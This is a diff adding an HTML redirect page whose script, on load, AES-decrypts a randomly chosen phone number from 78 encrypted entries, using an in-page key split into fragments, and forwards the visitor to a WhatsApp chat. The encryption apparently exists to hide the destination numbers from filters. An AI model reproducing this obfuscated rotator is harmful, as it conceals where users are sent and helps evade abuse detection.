@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirecting…</title>
+  <meta http-equiv="Cache-Control" content="no-store"/>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script>
+    const CTS = ["Vp44pRV57I6t+oOiSHnX+A==", "mg/exnWqwQs7cuV+OlTXvA==", "i/LsxmdepZo0aFXOFlXZVw==", "9XwORyM4WU6ydxU75L/z4w==", "DIcpaxkuEdNKolb/AZtEqw==", "v/U1bk0Kq2xqaDFx6GqAkg==", "VWyNaIz04M93Epv5r8h2UA==", "lw9z9VDZebTc0CapBTVUWw==", "GajHBmHUPF9SDn4LDxfJTg==", "n2cnRgOznSG0ENgh6n2ymQ==", "l4Nu8ieR6FHFismEpa7rfg==", "MH5wERuuiSq3KYxEEwqe9g==", "lWiS0O0iiC6LBHx7SvLbhQ==", "qvL2hV18eMIEgQp1F9uSSQ==", "gOGTnpVd98HPRf0ZpPtsiQ==", "Wyf4A5+mObAW3sVQ6IwG5g==", "WPmtHvmeNz0Nzs0Lns9NoA==", "lP4cHbq5IUtrsOTyi/Amtw==", "w4XEvFdck9mqRngPBxC2Uw==", "dfu3JefHtMtZ5QuiTr+f5g==", "HOBqX7r7D/mqONbcMzd4oQ==", "L/tX6FTFYXm3nvdm+/9rpw==", "xxyESXiUw46PoBp37uFraw==", "S7swj9xuEpsttzKLN0Sj5w==", "sQUrU9LfJG/VpVwvI4RKMg==", "YuKHhjB2X4JuXTzBgNPW8Q==", "KyUgZJ97DaThAHT3j9f8Aw==", "zjBX5d9/M78Rcp+KzHsbvg==", "Z3gWzQ0Y4k6PVQ+xNFEWJg==", "AE4wQ8dc+Zj+69eFFrH8pg==", "sAC4A6IYGxIxBllH3Wa1vQ==", "/fHgmBDWE394htei6YUZ8Q==", "DnlmkamY5ksjR8nc8pvnFA==", "dJEShU949sUjYSOAZOBk8w==", "Vb1Uei4zEDvzh+Feh0dtVw==", "hcDE3lb1Qye2PW7Kf8TREQ==", "PnoCLsWz62Orjljr2W5Q3g==", "/jWm95Y4alu86c0wVWazYA==", "xJLmPzRnzC4n+26+Yu2wJQ==", "FHRtweGkojokpJSD9Cpa7w==", "bmg6oPkQE2rLcUFP1BrZ+g==", "24M8bjhnmbZy+8M92dNbAA==", "aauDIkGBb5rUFozAFr2aYg==", "ePStVLdAkFifkY7juXiyzg==", "U98u0+nw1bqIIchBy4UcPQ==", "uyxDX0JB3ao/P7L5TrPZXQ==", "mR6PPBnhu0W5/4KlrVt8qg==", "BbCvALoHFLiMqWY14LJpMA==", "a7MoPB5XDxqQraUu6+U5sg==", "1gs8NTDxxZb/SxYcb5zt8w==", "MqRpIxJOFV4wFvUdv227qA==", "5HoNN76h3Yx3hqRkM8g2uw==", "DBVbloJiw4i7VUKmKjLqTg==", "qIhLKOBdfylFflQbRXvyXw==", "zRezBif6UlHQ1MrHIJ0F7g==", "e3YGB3iLajjBKnkHVeTU3w==", "TEOWngLsB72VBkcOCosufQ==", "1ebjIHPeiYfzVJ1lMhL9Tg==", "/bKfhKAHwxklfdy9WgpHPw==", "YcDecCaRHRjq7aQQx3GNFA==", "VT6HmNCdMNc4g+W1kvrBpw==", "jlyEfcOfeBe57e3YUf/g3g==", "Se6dAQYmeOUOTopQYQFVIw==", "Xjds4pvczPHRSKWmfMymsg==", "2GtRNhOV0USqot7mINZG0g==", "7yFOgSqGlT9kSnaPFky+TA==", "4XDvkgjRY8YvODLIDD3HGg==", "jJsWoNSkcneSAoDsIMvR5g==", "jCkRTnAiGOwBZerr+DeKMg==", "vd7feLim+n5XcCY06aeqDA==", "edGdacVe+OPorziGraY0yw==", "a9IpSYiXxiott2g2Owxl0A==", "cyfBjEtD1pgTdvbXpjpDPg==", "Cr7z4TpF+xfAyKQhAaMedw==", "HAV47ZlEM6wbUQQrqjn6Og==", "LpMqJSNE1NqLxey3sxyvaw==", "+NEn/lxxEGdnXB/8XAS5bg==", "5hj2U38K9fCm44smNmSukA=="];
+    const IVS = ["DUbmF0UABFGm31pyS7YrRQ==", "DrJb/Kk0KVPs8fUjuN1G2A==", "dSi2PC0OsuRL0Iw0hUHqcQ==", "6zounw2s5TvNIHzjY2ixEw==", "J5fTnSzZGQgZ3THR24E2xA==", "FGpbgdLWN5DfbOMnJ4Qyvg==", "6SxsaAE7vN2l3/cTrzqUWw==", "icFLVDn4uEw+NTiqxbjscg==", "LILQ2NTviH6ruQeuYFAFKQ==", "UurQdmfsb6SJisNDxWlH5w==", "0TE7aDQh4bWW8pq4vDZKlQ==", "55ZsfDWrVbe7Yod2bjMJPQ==", "yBvtnltkPUr9YR6bqonq+A==", "ZDUUT4fmHQu5YbmUdc6bXg==", "t0LFz5SrpGHJft77wBA2Yg==", "2M8+3bfFk4E5z55kSOGiRA==", "pion7faL8cv0WSMk0H8QPg==", "aRtpY9Gb5qRzwhvmJe0TUg==", "7fifZK1bi8NFsB5m0Q/JNA==", "qinwTc8eJuvGLnarKqKTcA==", "+G/rmg+6vYHZpTshsTlj9g==", "pdxNLZzzB7R4GK2KD/fgHQ==", "Sn7+GUk4xYfNrEcBTy4B1w==", "kW1UrOtce8ZWix3YDFc/0g==", "VkQJZN2nd0tfStb4DJpwHQ==", "XsEX4mmLeFVJzCv2ydY0GQ==", "NtNFUImeTyc70cljbGbbrg==", "m1ufKuDPya8Kjd7nrwMdHw==", "PHYmsOCmmUkj9IfjH+TUbA==", "1HKD7l33tGBqpaJK3EKoIQ==", "8BSQTo1gf5zvL1uYXJSXWA==", "mRTwCXXf2+psmHqKOBERLA==", "FdCzMmVE4JhIVCt/DX6aXw==", "hlFTMli/zEjn1De2QrLSHA==", "RDGOP1ztxLZ3qQYJKJ51ow==", "1X9/2nhi0tV4poBvMmTwNA==", "ykmCYOa7/6xLsYfBNfwRUw==", "p9BHL/7x+KP251yx+qvcTQ==", "H29Y2V6/ZeFbopQ54BSbSA==", "9tn7738hxO91BahIKIUf7A==", "oAOtCQgprgiK8M+v4RL+gA==", "yopoXhavTjed2+iZH5uZlA==", "hIhfE42lNptOZCp3zRPhiw==", "t+hoZJWNIsJdycjRU+wgUw==", "7htj6Ze6joLP8UvKRwlM/w==", "C7JTl0BUrGeIiS7nBKvdyg==", "2f0W2fdkaLvrPQM7j/ceIA==", "4hTHK1+JSlQn+gPfub6wDQ==", "AWV/DPH8Jx6q8IB+e2SZfg==", "41ZSmiGFjeGwgrihgo3jEQ==", "fuE5SyDL3H8y/UQcXT8AAQ==", "9hVu8ckXOOmKRea6vWT2iA==", "DrNyM2MgFkRjuvd6TSVl2Q==", "SclnEGZOtI9SL9KP20cmYQ==", "zkdqEbB5BcsLONeEkuccVg==", "btCVocaRYCxj93wEhgxaaA==", "vkt2G8PnNzLRvy0HScRPjQ==", "Q9JjKliXYUrXI+ULkkFVTg==", "rCW2OpByAzfUzPVmpWGKcQ==", "vyzALEt48nepJtl9xCjX/A==", "WR1jjX6T/EyVB8SoMBnYpA==", "GUSQB+JnQfxbmXKXgQd/pw==", "O9FsmJGzOuzJDYJw4lcBSA==", "FOmj/woIpBMfIWQvbt8DlA==", "efzuK7X0KzdSnjVZsTAp6g==", "ePHY3ufzauZcIOZ8S0zIDw==", "QOxBesBA1INnAvMX5hdLRQ==", "3tCoZemYpNveIpNwLqvvnA==", "w1H995qBc48mRfzDHA9S4Q==", "NMQoHJ/1LSws/Jy/rxsjIQ==", "WSHEZU7HC1e5TLS6LfrTLA==", "McorCqFSC//HW5CfyaitDw==", "XeO4bCMEK+vq8eprrDlJvA==", "eoXwsUTDUh9vpsf47TF24A==", "lpkPDdLcem8zmWqJkEZfbQ==", "fm6HyaqWdCGaZh1LwisXcw==", "9ID0JbDc38hNoFFzFN6aPA==", "HOW//9yCYE82HlmIOKEJmA=="];
+    const P0 = "77a1a380", P1 = "57e1620f", P2 = "122e2fd2", P3 = "aace38c5";
+    const PASS = P0 + P1 + P2 + P3;
+
+    function sha256Hex(s) { return CryptoJS.SHA256(s).toString(CryptoJS.enc.Hex); }
+    function keyFromPass(pass) { return CryptoJS.enc.Hex.parse(sha256Hex(pass)); }
+
+    function go() {
+      try {
+        const idx = Math.floor(Math.random() * CTS.length);
+        const key = keyFromPass(PASS);
+        const iv = CryptoJS.enc.Base64.parse(IVS[idx]);
+        const cipherParams = CryptoJS.lib.CipherParams.create({
+          ciphertext: CryptoJS.enc.Base64.parse(CTS[idx])
+        });
+        const plain = CryptoJS.AES.decrypt(cipherParams, key, {
+          iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
+        });
+        const num = plain.toString(CryptoJS.enc.Utf8);
+        if (!num) throw new Error('decrypt-failed');
+        window.location.replace('https://wa.me/' + num);
+      } catch (e) {
+        setTimeout(go, 100);
+      }
+    }
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', go); else go();
+  </script>
+</head>
+<body></body>
+</html>
